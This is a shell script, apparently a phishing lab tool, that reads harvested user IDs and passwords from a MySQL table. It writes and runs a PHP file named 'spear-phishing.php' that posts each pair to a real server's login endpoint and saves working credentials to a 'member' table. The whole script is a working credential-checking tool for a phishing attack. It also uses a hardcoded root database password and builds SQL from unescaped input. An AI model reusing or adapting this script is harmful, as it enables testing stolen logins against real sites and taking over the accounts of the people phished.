#!/bin/sh

clear

echo -ne "\033[1;34m
		########################################################################################
		#                                                                                      #
		#                                                                                      #
                #                     __     __      ____________       ___     ___                    #
                #                    |  |   /  /    |            |     |   |   |   |                   #
                #                    |  |  /  /     |___      ___|     |   |___|   |                   #
                #                    |  |_/  /          |    |         |           |                   #
                #                    |  |_  |           |    |         |    ___    |                   #
                #                    |  | \  \          |    |         |   |   |   |                   #
                #                    |  |  \  \         |    |         |   |   |   |                   #
                #                    |__|   \__\        |____|         |___|   |___|                   #
		#                                                                                      #
		#                                                                                      #
		#                                                                                      #
		#                                                                                      #
		########################################################################################
                \033[1;34m#\033[1;m                                    \033[1;41mmake by kimtaekhan\033[1;m                                \033[1;34m#
                #                                                                                      #
                #\033[1;m                                     \033[1;44m[!] Warning ! !!!!!\033[1;m                                   \033[1;34m#
                \033[1;34m#\033[1;m                           \033[1;44mDo not try to attack outside !!!!!\033[1;m                \033[1;34m#
		\033[1;34m########################################################################################\033[1;m
"

echo -ne "\033[1;34m\tInput Real Server IP -> \033[1;m \033[1;31m->\033[1;m"
read -p " " serverip

# should be used your mysql ID and Password for root and table name !
mysql -uroot -p111111 myhomepage -e "select * from checkyet" > checklist.txt
awk '{print $1}' checklist.txt > usernumber_list.txt
awk '{print $2}' checklist.txt > userid_list.txt
awk '{print $3}' checklist.txt > userpw_list.txt
sed -i '1d' usernumber_list.txt
sed -i '1d' userid_list.txt
sed -i '1d' userpw_list.txt

tail -1 usernumber_list.txt > usernumber.txt

listnumber=`cat usernumber.txt`

for (( i=1; i<=listnumber; i++))
{
        userid=`cat userid_list.txt | sed -n $i\p`
        userpw=`cat userpw_list.txt | sed -n $i\p`

cat << EOF > spear-phishing.php
<?php
\$url = 'http://$serverip/loginok.html?';

\$data = array( "userid" => "$userid", "userpw" => "$userpw");


// use key 'http' even if you send the request to https://...
\$options = array(
    'http' => array( // => if \ $ a is not equal to \ $ b. TRUE
        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
        'method'  => 'POST',
        'content' => http_build_query(\$data)
    )
);
\$context  = stream_context_create(\$options);
\$result = file_get_contents(\$url, false, \$context);
if (\$result === FALSE) { /* Handle error */ }

\$myfile = fopen("newfile.txt", "w") or die("Could not open file !");
\$txt = \$result;
fwrite(\$myfile, \$txt);
fclose(\$myfile);

#echo var_dump(\$result); // dump

\$finds= strpos("\$txt", "location.href = 'login.html';");

if (\$finds == 59)
{
		\$myfiles = fopen("counter.txt", "w") or die("Could not open file !");
		fwrite(\$myfiles, "True");
		fclose(\$myfiles);
}
else
{
		\$myfiles = fopen("counter.txt", "w") or die("Could not open file !");
		fwrite(\$myfiles, "False");
		fclose(\$myfiles);
}
?>
EOF

php spear-phishing.php

counterread=`cat counter.txt`

if [ "$counterread" = "True" ]; then
	mysql -uroot -p111111 myhomepage -e "insert into member values(null,'$userid','$userpw',now())"
fi

}
